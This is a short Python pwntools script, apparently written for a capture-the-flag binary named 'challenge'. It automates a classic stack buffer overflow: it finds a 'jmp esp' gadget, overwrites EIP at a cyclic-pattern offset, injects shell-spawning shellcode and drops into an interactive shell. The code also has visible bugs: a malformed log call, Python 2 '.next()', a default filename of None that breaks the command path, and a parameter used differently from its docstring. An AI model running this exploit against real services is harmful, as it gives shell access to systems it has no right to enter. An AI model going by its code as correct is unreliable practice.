# Import everything in the pwntools namespace
from pwn import *

def overflowattack(filename = "challenge",cyclic_pattern_length = 512,exploit=None,execute_command = None,search_term = "jmp esp",attack_command = None):
    '''
    The function to do overflow attack with various variations

    :param filename: Name of the filename which is to be executed or None
    :param cyclic_pattern_length: Lenght of the cyclic pattern for string to be executed for overflow or 512
    :param exploit: Address exactly where eip is stored or None
    :param execute_command: Command which is to be executed on the server or None
    :param search_term: Term in binary which is to be searched to find the exploit or "jmp esp"
    :param attack_command: Attack command which is to be executed at the exploit address or None
    :return:
    '''

    if not execute_command:
        execute_command = "./" + filename

    io = gdb.debug(execute_command)
    # Attach a debugger to the process so that we can step through
    pause()

    # Load a copy of the binary so that we can find the search term
    binary = ELF(execute_command)

    # Assemble the byte sequence for search term so we can search for it
    jmp_esp = asm(search_term)
    jmp_esp = binary.search(jmp_esp).next()

    log.info("Found %s at %#x" % search_term,jmp_esp)

    # Overflow the buffer with a cyclic pattern to make it easy to find offsets
    #
    # If we let the program crash with just the pattern as input, the register
    # state will look something like this:
    #
    #  EBP  0x6161616b ('kaaa')
    # *ESP  0xff84be30 <-- 'maaanaaaoaaapaaaqaaar...'
    # *EIP  0x6161616c ('laaa')
    crash = False

    if crash:
        pattern = cyclic(cyclic_pattern_length)
        io.sendline(pattern)
        pause()
        sys.exit()
    if not exploit:
        # Fill out the buffer until where we control EIP
        exploit = cyclic(cyclic_find(0x6161616c))

        # Fill the spot we control EIP with a 'jmp eip'
        exploit += pack(jmp_esp)

        # Add our shellcode
        exploit += asm(shellcraft.sh())

        # gets() waits for a newline
        io.sendline(exploit)
        if attack_command:
            io.send(attack_command)
        # Enjoy our shell
        io.interactive()

if __name__ == "__main__":
    overflowattack(filename=None,cyclic_pattern_length=512,exploit=None,execute_command=None,search_term="jmp esp",attack_command=None)